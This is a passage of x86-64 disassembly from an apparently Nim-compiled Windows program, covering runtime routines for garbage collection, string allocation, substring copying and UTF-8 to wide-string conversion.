  403971:	49 c7 85 a0 33 00 00 	movq   $0x0,0x33a0(%r13)
  403978:	00 00 00 00 
  40397c:	e8 25 ec ff ff       	call   4025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>
  403981:	b9 00 20 00 00       	mov    $0x2000,%ecx
  403986:	49 c7 85 a8 33 00 00 	movq   $0x0,0x33a8(%r13)
  40398d:	00 00 00 00 
  403991:	49 c7 85 90 33 00 00 	movq   $0x0,0x3390(%r13)
  403998:	00 00 00 00 
  40399c:	e8 c1 f5 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  4039a1:	49 8b 7d 40          	mov    0x40(%r13),%rdi
  4039a5:	49 c7 85 98 33 00 00 	movq   $0x3ff,0x3398(%r13)
  4039ac:	ff 03 00 00 
  4039b0:	49 89 85 a8 33 00 00 	mov    %rax,0x33a8(%r13)
  4039b7:	49 8b 45 30          	mov    0x30(%r13),%rax
  4039bb:	49 c7 85 90 33 00 00 	movq   $0x0,0x3390(%r13)
  4039c2:	00 00 00 00 
  4039c6:	49 c7 85 a0 33 00 00 	movq   $0x0,0x33a0(%r13)
  4039cd:	00 00 00 00 
  4039d1:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  4039d5:	eb 1f                	jmp    4039f6 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x216>
  4039d7:	48 8b 19             	mov    (%rcx),%rbx
  4039da:	e8 c7 eb ff ff       	call   4025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>
  4039df:	48 89 d9             	mov    %rbx,%rcx
  4039e2:	e9 7c ff ff ff       	jmp    403963 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x183>
  4039e7:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
  4039eb:	4c 89 e9             	mov    %r13,%rcx
  4039ee:	48 ff c3             	inc    %rbx
  4039f1:	e8 c7 f6 ff ff       	call   4030bd <markS__SOJE9bROCOc8iabVsKM64Sg>
  4039f6:	48 39 de             	cmp    %rbx,%rsi
  4039f9:	7d ec                	jge    4039e7 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x207>
  4039fb:	49 83 bd 00 34 00 00 	cmpq   $0x0,0x3400(%r13)
  403a02:	00 
  403a03:	75 21                	jne    403a26 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x246>
  403a05:	48 8b 05 34 e1 01 00 	mov    0x1e134(%rip),%rax        # 421b40 <globalMarkersLen>
  403a0c:	48 8d 3d cd 73 01 00 	lea    0x173cd(%rip),%rdi        # 41ade0 <globalMarkers>
  403a13:	31 db                	xor    %ebx,%ebx
  403a15:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  403a19:	48 39 de             	cmp    %rbx,%rsi
  403a1c:	7c 08                	jl     403a26 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x246>
  403a1e:	ff 14 df             	call   *(%rdi,%rbx,8)
  403a21:	48 ff c3             	inc    %rbx
  403a24:	eb f3                	jmp    403a19 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x239>
  403a26:	48 8b 05 93 73 01 00 	mov    0x17393(%rip),%rax        # 41adc0 <threadLocalMarkersLen>
  403a2d:	48 8d 3d 2c 06 01 00 	lea    0x1062c(%rip),%rdi        # 414060 <threadLocalMarkers>
  403a34:	31 db                	xor    %ebx,%ebx
  403a36:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  403a3a:	48 39 de             	cmp    %rbx,%rsi
  403a3d:	7d 16                	jge    403a55 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x275>
  403a3f:	49 8b 85 b0 33 00 00 	mov    0x33b0(%r13),%rax
  403a46:	31 db                	xor    %ebx,%ebx
  403a48:	49 8b bd c0 33 00 00 	mov    0x33c0(%r13),%rdi
  403a4f:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  403a53:	eb 08                	jmp    403a5d <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x27d>
  403a55:	ff 14 df             	call   *(%rdi,%rbx,8)
  403a58:	48 ff c3             	inc    %rbx
  403a5b:	eb dd                	jmp    403a3a <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x25a>
  403a5d:	48 39 de             	cmp    %rbx,%rsi
  403a60:	7c 11                	jl     403a73 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x293>
  403a62:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
  403a66:	4c 89 e9             	mov    %r13,%rcx
  403a69:	48 ff c3             	inc    %rbx
  403a6c:	e8 4c f6 ff ff       	call   4030bd <markS__SOJE9bROCOc8iabVsKM64Sg>
  403a71:	eb ea                	jmp    403a5d <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x27d>
  403a73:	4d 8d 75 68          	lea    0x68(%r13),%r14
  403a77:	41 c6 85 30 31 00 00 	movb   $0x1,0x3130(%r13)
  403a7e:	01 
  403a7f:	45 31 e4             	xor    %r12d,%r12d
  403a82:	49 8d 85 10 29 00 00 	lea    0x2910(%r13),%rax
  403a89:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  403a8e:	4b 8b b4 e5 10 29 00 	mov    0x2910(%r13,%r12,8),%rsi
  403a95:	00 
  403a96:	48 85 f6             	test   %rsi,%rsi
  403a99:	75 58                	jne    403af3 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x313>
  403a9b:	49 ff c4             	inc    %r12
  403a9e:	49 81 fc 00 01 00 00 	cmp    $0x100,%r12
  403aa5:	75 e7                	jne    403a8e <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x2ae>
  403aa7:	49 ff 85 60 33 00 00 	incq   0x3360(%r13)
  403aae:	41 c6 85 30 31 00 00 	movb   $0x0,0x3130(%r13)
  403ab5:	00 
  403ab6:	e8 e5 e1 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  403abb:	ba 00 00 40 00       	mov    $0x400000,%edx
  403ac0:	48 8b 80 38 29 00 00 	mov    0x2938(%rax),%rax
  403ac7:	48 01 c0             	add    %rax,%rax
  403aca:	48 3d 00 00 40 00    	cmp    $0x400000,%rax
  403ad0:	48 0f 4c c2          	cmovl  %rdx,%rax
  403ad4:	49 39 85 68 33 00 00 	cmp    %rax,0x3368(%r13)
  403adb:	49 89 45 08          	mov    %rax,0x8(%r13)
  403adf:	49 0f 4d 85 68 33 00 	cmovge 0x3368(%r13),%rax
  403ae6:	00 
  403ae7:	49 89 85 68 33 00 00 	mov    %rax,0x3368(%r13)
  403aee:	e9 f7 00 00 00       	jmp    403bea <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x40a>
  403af3:	31 ff                	xor    %edi,%edi
  403af5:	48 8b 6c fe 10       	mov    0x10(%rsi,%rdi,8),%rbp
  403afa:	48 89 f8             	mov    %rdi,%rax
  403afd:	48 c1 e0 06          	shl    $0x6,%rax
  403b01:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  403b06:	48 85 ed             	test   %rbp,%rbp
  403b09:	75 11                	jne    403b1c <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x33c>
  403b0b:	48 ff c7             	inc    %rdi
  403b0e:	48 83 ff 08          	cmp    $0x8,%rdi
  403b12:	75 e1                	jne    403af5 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x315>
  403b14:	48 8b 36             	mov    (%rsi),%rsi
  403b17:	e9 7a ff ff ff       	jmp    403a96 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x2b6>
  403b1c:	40 f6 c5 01          	test   $0x1,%bpl
  403b20:	0f 84 b7 00 00 00    	je     403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b26:	48 8b 5e 08          	mov    0x8(%rsi),%rbx
  403b2a:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  403b2f:	48 c1 e3 09          	shl    $0x9,%rbx
  403b33:	48 0b 5c 24 28       	or     0x28(%rsp),%rbx
  403b38:	48 89 da             	mov    %rbx,%rdx
  403b3b:	e8 92 dd ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  403b40:	84 c0                	test   %al,%al
  403b42:	0f 84 95 00 00 00    	je     403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b48:	48 89 da             	mov    %rbx,%rdx
  403b4b:	48 c1 e2 0c          	shl    $0xc,%rdx
  403b4f:	f6 02 01             	testb  $0x1,(%rdx)
  403b52:	0f 84 85 00 00 00    	je     403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b58:	4c 8b 7a 08          	mov    0x8(%rdx),%r15
  403b5c:	49 81 ff c8 0f 00 00 	cmp    $0xfc8,%r15
  403b63:	7e 09                	jle    403b6e <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x38e>
  403b65:	48 83 7a 28 01       	cmpq   $0x1,0x28(%rdx)
  403b6a:	77 49                	ja     403bb5 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3d5>
  403b6c:	eb 6f                	jmp    403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b6e:	48 8b 42 30          	mov    0x30(%rdx),%rax
  403b72:	48 8d 5a 38          	lea    0x38(%rdx),%rbx
  403b76:	48 01 d8             	add    %rbx,%rax
  403b79:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  403b7e:	48 39 5c 24 30       	cmp    %rbx,0x30(%rsp)
  403b83:	76 58                	jbe    403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b85:	48 83 7b 08 01       	cmpq   $0x1,0x8(%rbx)
  403b8a:	76 24                	jbe    403bb0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3d0>
  403b8c:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  403b91:	48 89 da             	mov    %rbx,%rdx
  403b94:	e8 c3 da ff ff       	call   40165c <contains__ClLkUQKF8KrRxQPdAJDd5w>
  403b99:	84 c0                	test   %al,%al
  403b9b:	75 13                	jne    403bb0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3d0>
  403b9d:	48 89 d9             	mov    %rbx,%rcx
  403ba0:	e8 b1 e1 ff ff       	call   401d56 <prepareDealloc__fvhnFro5wEfzy879alizcUQ>
  403ba5:	48 89 da             	mov    %rbx,%rdx
  403ba8:	4c 89 f1             	mov    %r14,%rcx
  403bab:	e8 64 e8 ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  403bb0:	4c 01 fb             	add    %r15,%rbx
  403bb3:	eb c9                	jmp    403b7e <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x39e>
  403bb5:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  403bba:	48 8d 5a 20          	lea    0x20(%rdx),%rbx
  403bbe:	48 89 da             	mov    %rbx,%rdx
  403bc1:	e8 96 da ff ff       	call   40165c <contains__ClLkUQKF8KrRxQPdAJDd5w>
  403bc6:	84 c0                	test   %al,%al
  403bc8:	75 13                	jne    403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403bca:	48 89 d9             	mov    %rbx,%rcx
  403bcd:	e8 84 e1 ff ff       	call   401d56 <prepareDealloc__fvhnFro5wEfzy879alizcUQ>
  403bd2:	48 89 da             	mov    %rbx,%rdx
  403bd5:	4c 89 f1             	mov    %r14,%rcx
  403bd8:	e8 37 e8 ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  403bdd:	48 ff 44 24 28       	incq   0x28(%rsp)
  403be2:	48 d1 ed             	shr    $1,%rbp
  403be5:	e9 1c ff ff ff       	jmp    403b06 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x326>
  403bea:	49 8b 45 30          	mov    0x30(%r13),%rax
  403bee:	31 db                	xor    %ebx,%ebx
  403bf0:	49 8b 7d 40          	mov    0x40(%r13),%rdi
  403bf4:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  403bf8:	48 39 de             	cmp    %rbx,%rsi
  403bfb:	7d 24                	jge    403c21 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x441>
  403bfd:	49 8b 45 18          	mov    0x18(%r13),%rax
  403c01:	ba f4 01 00 00       	mov    $0x1f4,%edx
  403c06:	49 c7 45 30 00 00 00 	movq   $0x0,0x30(%r13)
  403c0d:	00 
  403c0e:	48 01 c0             	add    %rax,%rax
  403c11:	48 3d f4 01 00 00    	cmp    $0x1f4,%rax
  403c17:	48 0f 4c c2          	cmovl  %rdx,%rax
  403c1b:	49 89 45 10          	mov    %rax,0x10(%r13)
  403c1f:	eb 0e                	jmp    403c2f <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x44f>
  403c21:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
  403c25:	48 ff c3             	inc    %rbx
  403c28:	e8 64 f2 ff ff       	call   402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.82>
  403c2d:	eb c9                	jmp    403bf8 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x418>
  403c2f:	48 83 c4 48          	add    $0x48,%rsp
  403c33:	5b                   	pop    %rbx
  403c34:	5e                   	pop    %rsi
  403c35:	5f                   	pop    %rdi
  403c36:	5d                   	pop    %rbp
  403c37:	41 5c                	pop    %r12
  403c39:	41 5d                	pop    %r13
  403c3b:	41 5e                	pop    %r14
  403c3d:	41 5f                	pop    %r15
  403c3f:	c3                   	ret

0000000000403c40 <copyStringRC1>:
  403c40:	57                   	push   %rdi
  403c41:	56                   	push   %rsi
  403c42:	53                   	push   %rbx
  403c43:	48 83 ec 20          	sub    $0x20,%rsp
  403c47:	48 85 c9             	test   %rcx,%rcx
  403c4a:	48 89 ce             	mov    %rcx,%rsi
  403c4d:	0f 84 88 00 00 00    	je     403cdb <copyStringRC1+0x9b>
  403c53:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
  403c58:	78 7c                	js     403cd6 <copyStringRC1+0x96>
  403c5a:	48 8b 19             	mov    (%rcx),%rbx
  403c5d:	b8 07 00 00 00       	mov    $0x7,%eax
  403c62:	48 83 fb 07          	cmp    $0x7,%rbx
  403c66:	48 0f 4c d8          	cmovl  %rax,%rbx
  403c6a:	48 83 c6 10          	add    $0x10,%rsi
  403c6e:	e8 2d e0 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  403c73:	48 8d 48 38          	lea    0x38(%rax),%rcx
  403c77:	48 89 c7             	mov    %rax,%rdi
  403c7a:	e8 61 fb ff ff       	call   4037e0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg>
  403c7f:	48 8d 8f a0 00 00 00 	lea    0xa0(%rdi),%rcx
  403c86:	48 8d 53 21          	lea    0x21(%rbx),%rdx
  403c8a:	e8 d8 ec ff ff       	call   402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>
  403c8f:	48 8d 53 11          	lea    0x11(%rbx),%rdx
  403c93:	48 89 c7             	mov    %rax,%rdi
  403c96:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
  403c9a:	48 c7 07 08 00 00 00 	movq   $0x8,(%rdi)
  403ca1:	48 8d 05 78 73 00 00 	lea    0x7378(%rip),%rax        # 40b020 <strDesc__D0UzA4zsDu5tgpJQ9a9clXPg>
  403ca8:	4c 89 c9             	mov    %r9,%rcx
  403cab:	48 89 47 08          	mov    %rax,0x8(%rdi)
  403caf:	e8 0e dd ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  403cb4:	48 8b 46 f0          	mov    -0x10(%rsi),%rax
  403cb8:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
  403cbc:	48 89 47 10          	mov    %rax,0x10(%rdi)
  403cc0:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
  403cc4:	48 8d 47 20          	lea    0x20(%rdi),%rax
  403cc8:	48 89 c7             	mov    %rax,%rdi
  403ccb:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
  403ccf:	f3 a4                	rep movsb (%rsi),(%rdi)
  403cd1:	4c 89 ce             	mov    %r9,%rsi
  403cd4:	eb 05                	jmp    403cdb <copyStringRC1+0x9b>
  403cd6:	48 83 41 f0 08       	addq   $0x8,-0x10(%rcx)
  403cdb:	48 89 f0             	mov    %rsi,%rax
  403cde:	48 83 c4 20          	add    $0x20,%rsp
  403ce2:	5b                   	pop    %rbx
  403ce3:	5e                   	pop    %rsi
  403ce4:	5f                   	pop    %rdi
  403ce5:	c3                   	ret

0000000000403ce6 <newObj>:
  403ce6:	55                   	push   %rbp
  403ce7:	57                   	push   %rdi
  403ce8:	56                   	push   %rsi
  403ce9:	53                   	push   %rbx
  403cea:	48 83 ec 28          	sub    $0x28,%rsp
  403cee:	48 89 d6             	mov    %rdx,%rsi
  403cf1:	48 89 cd             	mov    %rcx,%rbp
  403cf4:	e8 a7 df ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  403cf9:	48 8d 78 38          	lea    0x38(%rax),%rdi
  403cfd:	48 89 c3             	mov    %rax,%rbx
  403d00:	48 89 f9             	mov    %rdi,%rcx
  403d03:	e8 d8 fa ff ff       	call   4037e0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg>
  403d08:	48 8d 56 10          	lea    0x10(%rsi),%rdx
  403d0c:	48 8d 8b a0 00 00 00 	lea    0xa0(%rbx),%rcx
  403d13:	e8 4f ec ff ff       	call   402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>
  403d18:	48 89 fa             	mov    %rdi,%rdx
  403d1b:	48 89 c3             	mov    %rax,%rbx
  403d1e:	48 89 68 08          	mov    %rbp,0x8(%rax)
  403d22:	48 89 c1             	mov    %rax,%rcx
  403d25:	48 c7 00 04 00 00 00 	movq   $0x4,(%rax)
  403d2c:	48 83 c3 10          	add    $0x10,%rbx
  403d30:	e8 96 ee ff ff       	call   402bcb <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46>
  403d35:	48 89 f2             	mov    %rsi,%rdx
  403d38:	48 89 d9             	mov    %rbx,%rcx
  403d3b:	e8 82 dc ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  403d40:	48 89 d8             	mov    %rbx,%rax
  403d43:	48 83 c4 28          	add    $0x28,%rsp
  403d47:	5b                   	pop    %rbx
  403d48:	5e                   	pop    %rsi
  403d49:	5f                   	pop    %rdi
  403d4a:	5d                   	pop    %rbp
  403d4b:	c3                   	ret

0000000000403d4c <rawNewString>:
  403d4c:	53                   	push   %rbx
  403d4d:	48 83 ec 20          	sub    $0x20,%rsp
  403d51:	bb 07 00 00 00       	mov    $0x7,%ebx
  403d56:	48 83 f9 07          	cmp    $0x7,%rcx
  403d5a:	48 0f 4d d9          	cmovge %rcx,%rbx
  403d5e:	48 8d 0d bb 72 00 00 	lea    0x72bb(%rip),%rcx        # 40b020 <strDesc__D0UzA4zsDu5tgpJQ9a9clXPg>
  403d65:	48 8d 53 11          	lea    0x11(%rbx),%rdx
  403d69:	e8 78 ff ff ff       	call   403ce6 <newObj>
  403d6e:	48 89 58 08          	mov    %rbx,0x8(%rax)
  403d72:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  403d79:	48 83 c4 20          	add    $0x20,%rsp
  403d7d:	5b                   	pop    %rbx
  403d7e:	c3                   	ret

0000000000403d7f <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.69>:
  403d7f:	41 54                	push   %r12
  403d81:	55                   	push   %rbp
  403d82:	57                   	push   %rdi
  403d83:	56                   	push   %rsi
  403d84:	53                   	push   %rbx
  403d85:	48 83 ec 30          	sub    $0x30,%rsp
  403d89:	31 ed                	xor    %ebp,%ebp
  403d8b:	e8 d8 d7 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.71>
  403d90:	48 85 c9             	test   %rcx,%rcx
  403d93:	48 89 c7             	mov    %rax,%rdi
  403d96:	74 03                	je     403d9b <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.69+0x1c>
  403d98:	48 8b 29             	mov    (%rcx),%rbp
  403d9b:	31 f6                	xor    %esi,%esi
  403d9d:	48 85 ff             	test   %rdi,%rdi
  403da0:	74 63                	je     403e05 <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.69+0x86>
  403da2:	41 89 e9             	mov    %ebp,%r9d
  403da5:	49 89 f8             	mov    %rdi,%r8
  403da8:	31 d2                	xor    %edx,%edx
  403daa:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  403db1:	00 
  403db2:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  403db9:	00 00 
  403dbb:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  403dc0:	ff 15 52 6f 02 00    	call   *0x26f52(%rip)        # 42ad18 <Dl_32565001_>
  403dc6:	48 63 d8             	movslq %eax,%rbx
  403dc9:	49 89 dc             	mov    %rbx,%r12
  403dcc:	48 ff c3             	inc    %rbx
  403dcf:	48 01 db             	add    %rbx,%rbx
  403dd2:	48 89 d9             	mov    %rbx,%rcx
  403dd5:	e8 72 ff ff ff       	call   403d4c <rawNewString>
  403dda:	48 89 c1             	mov    %rax,%rcx
  403ddd:	48 89 18             	mov    %rbx,(%rax)
  403de0:	48 89 c6             	mov    %rax,%rsi
  403de3:	e8 80 d7 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.71>
  403de8:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
  403ded:	41 89 e9             	mov    %ebp,%r9d
  403df0:	49 89 f8             	mov    %rdi,%r8
  403df3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  403df8:	31 d2                	xor    %edx,%edx
  403dfa:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  403dff:	ff 15 13 6f 02 00    	call   *0x26f13(%rip)        # 42ad18 <Dl_32565001_>
  403e05:	48 89 f0             	mov    %rsi,%rax
  403e08:	48 83 c4 30          	add    $0x30,%rsp
  403e0c:	5b                   	pop    %rbx
  403e0d:	5e                   	pop    %rsi
  403e0e:	5f                   	pop    %rdi
  403e0f:	5d                   	pop    %rbp
  403e10:	41 5c                	pop    %r12
  403e12:	c3                   	ret

0000000000403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>:
  403e13:	55                   	push   %rbp
  403e14:	57                   	push   %rdi
  403e15:	56                   	push   %rsi
  403e16:	53                   	push   %rbx
  403e17:	48 83 ec 28          	sub    $0x28,%rsp
  403e1b:	be 00 00 00 00       	mov    $0x0,%esi
  403e20:	48 85 d2             	test   %rdx,%rdx
  403e23:	48 89 cf             	mov    %rcx,%rdi
  403e26:	48 0f 49 f2          	cmovns %rdx,%rsi
  403e2a:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
  403e2e:	48 85 c9             	test   %rcx,%rcx
  403e31:	74 06                	je     403e39 <substr__2yh9cer0ymNRHlOOg8P7IuA+0x26>
  403e33:	48 8b 01             	mov    (%rcx),%rax
  403e36:	48 01 c3             	add    %rax,%rbx
  403e39:	4c 39 c3             	cmp    %r8,%rbx
  403e3c:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  403e43:	49 0f 4f d8          	cmovg  %r8,%rbx
  403e47:	48 29 f3             	sub    %rsi,%rbx
  403e4a:	48 0f 48 d8          	cmovs  %rax,%rbx
  403e4e:	48 01 fe             	add    %rdi,%rsi
  403e51:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
  403e55:	48 89 e9             	mov    %rbp,%rcx
  403e58:	e8 ef fe ff ff       	call   403d4c <rawNewString>
  403e5d:	45 31 c0             	xor    %r8d,%r8d
  403e60:	48 89 28             	mov    %rbp,(%rax)
  403e63:	4c 39 c3             	cmp    %r8,%rbx
  403e66:	7c 0f                	jl     403e77 <substr__2yh9cer0ymNRHlOOg8P7IuA+0x64>
  403e68:	42 8a 54 06 10       	mov    0x10(%rsi,%r8,1),%dl
  403e6d:	42 88 54 00 10       	mov    %dl,0x10(%rax,%r8,1)
  403e72:	49 ff c0             	inc    %r8
  403e75:	eb ec                	jmp    403e63 <substr__2yh9cer0ymNRHlOOg8P7IuA+0x50>
  403e77:	48 83 c4 28          	add    $0x28,%rsp
  403e7b:	5b                   	pop    %rbx
  403e7c:	5e                   	pop    %rsi
  403e7d:	5f                   	pop    %rdi
  403e7e:	5d                   	pop    %rbp
  403e7f:	c3                   	ret

0000000000403e80 <newWideCString__K8rR70TBwrP6FNBzDhVVOA>:
  403e80:	41 54                	push   %r12
  403e82:	55                   	push   %rbp
  403e83:	57                   	push   %rdi
  403e84:	56                   	push   %rsi
  403e85:	53                   	push   %rbx
  403e86:	48 83 ec 20          	sub    $0x20,%rsp
  403e8a:	48 8d 04 95 02 00 00 	lea    0x2(,%rdx,4),%rax
  403e91:	00 
  403e92:	48 89 d6             	mov    %rdx,%rsi
  403e95:	48 89 cb             	mov    %rcx,%rbx
  403e98:	48 8d 14 85 02 00 00 	lea    0x2(,%rax,4),%rdx
  403e9f:	00 
  403ea0:	48 8d 0d b9 11 02 00 	lea    0x211b9(%rip),%rcx        # 425060 <NTI__4HwedE75WPfqZSQ0Cq2OUg_>
  403ea7:	e8 3a fe ff ff       	call   403ce6 <newObj>
  403eac:	48 8d 7e fd          	lea    -0x3(%rsi),%rdi
  403eb0:	31 c9                	xor    %ecx,%ecx
  403eb2:	45 31 c0             	xor    %r8d,%r8d
  403eb5:	4c 8d 56 ff          	lea    -0x1(%rsi),%r10
  403eb9:	4c 8d 5e fe          	lea    -0x2(%rsi),%r11
  403ebd:	4f 8d 0c 00          	lea    (%r8,%r8,1),%r9
  403ec1:	48 39 f1             	cmp    %rsi,%rcx
  403ec4:	4a 8d 2c 08          	lea    (%rax,%r9,1),%rbp
  403ec8:	0f 8d 55 01 00 00    	jge    404023 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x1a3>
  403ece:	44 8a 24 0b          	mov    (%rbx,%rcx,1),%r12b
  403ed2:	45 84 e4             	test   %r12b,%r12b
  403ed5:	79 0d                	jns    403ee4 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x64>
  403ed7:	44 89 e2             	mov    %r12d,%edx
  403eda:	c0 ea 05             	shr    $0x5,%dl
  403edd:	80 fa 06             	cmp    $0x6,%dl
  403ee0:	75 0e                	jne    403ef0 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x70>
  403ee2:	eb 19                	jmp    403efd <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x7d>
  403ee4:	49 0f be d4          	movsbq %r12b,%rdx
  403ee8:	48 ff c1             	inc    %rcx
  403eeb:	e9 1f 01 00 00       	jmp    40400f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x18f>
  403ef0:	44 89 e2             	mov    %r12d,%edx
  403ef3:	c0 ea 04             	shr    $0x4,%dl
  403ef6:	80 fa 0e             	cmp    $0xe,%dl
  403ef9:	75 2b                	jne    403f26 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xa6>
  403efb:	eb 36                	jmp    403f33 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xb3>
  403efd:	49 39 ca             	cmp    %rcx,%r10
  403f00:	7e 6d                	jle    403f6f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xef>
  403f02:	8a 54 0b 01          	mov    0x1(%rbx,%rcx,1),%dl
  403f06:	48 83 c1 02          	add    $0x2,%rcx
  403f0a:	49 89 d1             	mov    %rdx,%r9
  403f0d:	4c 89 e2             	mov    %r12,%rdx
  403f10:	48 c1 e2 06          	shl    $0x6,%rdx
  403f14:	41 83 e1 3f          	and    $0x3f,%r9d
  403f18:	81 e2 c0 07 00 00    	and    $0x7c0,%edx
  403f1e:	4c 09 ca             	or     %r9,%rdx
  403f21:	e9 e9 00 00 00       	jmp    40400f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x18f>
  403f26:	44 89 e2             	mov    %r12d,%edx
  403f29:	c0 ea 03             	shr    $0x3,%dl
  403f2c:	80 fa 1e             	cmp    $0x1e,%dl
  403f2f:	75 3e                	jne    403f6f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xef>
  403f31:	eb 37                	jmp    403f6a <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xea>
  403f33:	49 39 cb             	cmp    %rcx,%r11
  403f36:	7e 37                	jle    403f6f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xef>
  403f38:	8a 54 0b 02          	mov    0x2(%rbx,%rcx,1),%dl
  403f3c:	49 c1 e4 0c          	shl    $0xc,%r12
  403f40:	44 0f b6 4c 0b 01    	movzbl 0x1(%rbx,%rcx,1),%r9d
  403f46:	41 81 e4 00 f0 00 00 	and    $0xf000,%r12d
  403f4d:	48 83 c1 03          	add    $0x3,%rcx
  403f51:	83 e2 3f             	and    $0x3f,%edx
  403f54:	49 c1 e1 06          	shl    $0x6,%r9
  403f58:	4c 09 e2             	or     %r12,%rdx
  403f5b:	41 81 e1 c0 0f 00 00 	and    $0xfc0,%r9d
  403f62:	4c 09 ca             	or     %r9,%rdx
  403f65:	e9 93 00 00 00       	jmp    403ffd <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x17d>
  403f6a:	48 39 cf             	cmp    %rcx,%rdi
  403f6d:	7f 0d                	jg     403f7c <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xfc>
  403f6f:	48 ff c1             	inc    %rcx
  403f72:	ba fd ff 00 00       	mov    $0xfffd,%edx
  403f77:	e9 93 00 00 00       	jmp    40400f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x18f>
